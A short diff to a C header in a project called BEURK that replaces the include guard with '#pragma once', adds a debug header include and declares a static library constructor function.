@@ -18,8 +18,9 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef BEURK_H
-# define BEURK_H
+#pragma once
 
+#include "debug.h"
 
-#endif /* ! BEURK_H */
+/* library constructor */
+static void     init(void) __attribute__((constructor));
